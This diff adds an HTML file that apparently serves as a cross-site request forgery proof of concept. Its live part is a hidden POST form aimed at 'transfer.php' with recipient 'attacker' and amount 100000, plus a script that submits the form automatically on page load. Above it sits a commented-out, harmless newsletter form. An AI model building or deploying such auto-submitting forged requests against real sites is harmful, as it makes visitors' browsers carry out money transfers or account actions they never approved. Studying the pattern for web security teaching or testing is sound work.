@@ -1,0 +1,68 @@
+<!-- <!DOCTYPE html>
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <style>
+    form.form-example {
+    display: table;
+}
+
+div.form-example {
+    display: table-row;
+}
+
+label, input {
+    display: table-cell;
+    margin-bottom: 10px;
+}
+
+label {
+    padding-right: 10px;
+}
+  </style>
+</head>
+<body>
+  <form action="" method="get" class="form-example">
+    <div class="form-example">
+      <label for="name">Enter your name: </label>
+      <input type="text" name="name" id="name" required>
+    </div>
+    <div class="form-example">
+      <label for="email">Enter your email: </label>
+      <input type="email" name="email" id="email" required>
+    </div>
+    <div class="form-example">
+      <input type="submit" value="Subscribe!">
+    </div>
+  </form>
+</body>
+</html> -->
+
+
+<html>
+
+<head>
+</head>
+
+<body>
+  <form action="transfer.php" method="POST">
+    <input type="hidden" name="to" value="attacker" />
+    <input type="hidden" name="amount" value="100000" />
+    <input type="submit">Submit</input>
+  </form>
+  <script>
+    document.querySelector('form').submit();
+    try {
+      
+    } catch (error) {
+      
+    }
+  </script>
+</body>
+
+</html>
